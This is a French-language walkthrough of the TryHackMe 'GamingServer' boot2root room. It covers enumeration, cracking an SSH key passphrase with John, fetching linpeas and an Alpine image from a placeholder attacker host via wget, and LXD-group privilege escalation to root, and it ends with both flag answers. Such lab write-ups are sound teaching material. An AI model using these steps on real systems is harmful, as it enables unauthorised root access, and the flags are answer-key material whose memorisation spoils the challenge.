<img width="320" height="240" alt="image" src="https://github.com/user-attachments/assets/1c659c3a-e8a6-41c2-b039-2de10d958c7c" />


# Lien & Description
https://tryhackme.com/room/gamingserver

An Easy Boot2Root box for beginners

# Walkthrough :
## **Première question** : *What is the user flag?*
Bon commencons avec un scan nmap normal et regardons : `nmap -sC -sV VICTIME_IP`

Comme on peut le voir, on a un service SSH et aussi une page HTTP donc on fait un scan gobuster dessus :  `gobuster dir -u VICTIME_IP -w /user/share/wordlists/dirb/common.txt`

[![Capture-d-cran-2025-09-25-085244.png](https://i.postimg.cc/dQmRygGW/Capture-d-cran-2025-09-25-085244.png)](https://postimg.cc/4nyhCLLt)

Le scan gobuster est très interresant, il nous montre 2 paths

Le premier `/secret` nous dirigive vers `/secret/secretKey` une clé RSA encryptée, on l'enregistre sous ``id_rsa`` et après un `chmod 600 id_rsa` c'est parti pour la cracker

Prochaine étape c'est `ssh2john id_rsa > rsa.txt` 

Et après on donne tout le sale boulot à notre poto John : `john rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt`

[![Capture-d-cran-2025-09-25-091826.png](https://i.postimg.cc/8Ph1NQfb/Capture-d-cran-2025-09-25-091826.png)](https://postimg.cc/zVGmFQjL)

OK on a la passphrase mais toujours pas de nom le SSH :/

Donc retournons sur `/uploads` et ça nous dirige vers 3 choses

-La première, une wordlist et après un ctrl + f, notre "letmein" est dedans, bon je pense qu'il sera plus vraiment utile

-La deuxième un *manisfesto.txt* et après l'avoir lu, j'ai essayé de me connecté au SSH en tant que *Manisfesto, Hacker, Mentor* mais non ça marche pas...

-La troisième un *meme.jpg* peut-être qu'on va devoir faire de la stenographie mais ça sera pour plus tard mais sauvegardons l'image quand même

Bon bon bon, allons sur la page principale, peut-être qu'on trouvera quelque chose d'utile

[![Capture-d-cran-2025-09-25-093051.png](https://i.postimg.cc/6QVRv1PV/Capture-d-cran-2025-09-25-093051.png)](https://postimg.cc/HJxVG3dj)

"The House of Danak" évidemment j'ai essayé "danak" et le reste (draagan, droga) pour le SSH mais toujours rien

Bon regardons au code source de la page avec un `ctrl + u` et oooooooooohh mais qu'est-ce qu'on a la !!

[![Capture-d-cran-2025-09-25-093244.png](https://i.postimg.cc/sxGgpMXF/Capture-d-cran-2025-09-25-093244.png)](https://postimg.cc/sGyzzD7K)

"john, please add some actual content to the site! lorem ipsum is horrible to look at."

Essayons de nous connecter au service SSH avec john et let's gooo ça marche

`ssh john@VICTIME_IP -i id_rsa`

Et on a notre premier flag :)

[![Capture-d-cran-2025-09-25-093711.png](https://i.postimg.cc/L82ZMV5n/Capture-d-cran-2025-09-25-093711.png)](https://postimg.cc/nCSL4BvJ)

*What is the user flag?* : **a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e**
## **Seconde question** : *What is the root flag?*
OK commencons notre aventure vers les droits **root**

Allons dans `/tmp` et upload le bien aimé **linpeas.sh**

Pour ça on démarre un serveur http sur notre machine avec linpeas.sh au même endroit : `python3 -m http.server`

De retour sur la machine de la victime, on télécharge le fichier avec `wget http://ATTAQUANT_IP:8000/linpeas.sh .` (Et je ferme le serveur http)

[![Capture-d-cran-2025-09-25-094557.png](https://i.postimg.cc/htzNcVYR/Capture-d-cran-2025-09-25-094557.png)](https://postimg.cc/4YGW1HZW)

Et maintenant on execute linpeas : `sh linpeas.sh` et on regarde le résultat

D'abord je vais regarder dans les logs

<img width="1303" height="1152" alt="image" src="https://github.com/user-attachments/assets/70526dc7-4ede-4d58-814d-67adb6fd80db" />

Et après 30-40min àà chercher dans le vide `/var/log` j'ai rien trouvé

<img width="1150" height="250" alt="image" src="https://github.com/user-attachments/assets/b4e6a0b9-41ae-40aa-bc7e-ba31f2aef2b4" />

Bon reprennons du recul et regardons ce que linpeas nous dit et j'étais tellement impatient que je suis passé à côté du principal moyen pour devenir root...

<img width="845" height="66" alt="image" src="https://github.com/user-attachments/assets/9412fc47-c82e-4d59-b84e-9f2052ad1739" />

Ce que nous dit linpeas : "Yooo, John c'est un membre du groupe root et lxd ". Mmmh dommage, j'ai pas le mdp de John. Mais je sais pas ce que c'est le truc lxd donc je regarde sur google

Et après une recherche, j'apprends que LXD est **un outil de gestion des conteneurs du système d’exploitation Linux**. J'ai aussi vu un moyen d'escalade de privilege avec cette chose : https://www.exploit-db.com/exploits/46978

Je suis un gentil garçon et je suis les instructions du POC

**Sur ma machine :**

`wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine`

`bash build-alpine`

`python3 -m http.server`

**Sur la machine de la victime :**

`wget http://ATTAQUANT_IP:8000/alpine-v3.22-x86_64-20250925_1026.tar.gz .`

`nano exploit.py` *Et je colle le POC*

`chmod +x exploit.py`

`./exploit.py -f alpine-v3.22-x86_64-20250925_1026.tar.gz`

Et voilaaa

<img width="943" height="346" alt="image" src="https://github.com/user-attachments/assets/19cdb25a-f622-4190-a936-00711729b094" />

Faut pas se précipiter et être sur d'aller à `/mnt/root` pour voir tout les fichiers :)

<img width="1782" height="174" alt="image" src="https://github.com/user-attachments/assets/8f3ad874-0e05-467b-a7c7-01c919561d3c" />

*What is the root flag?* : **2e337b8c9f3aff0c2b3e8d4e6a7c88fc**
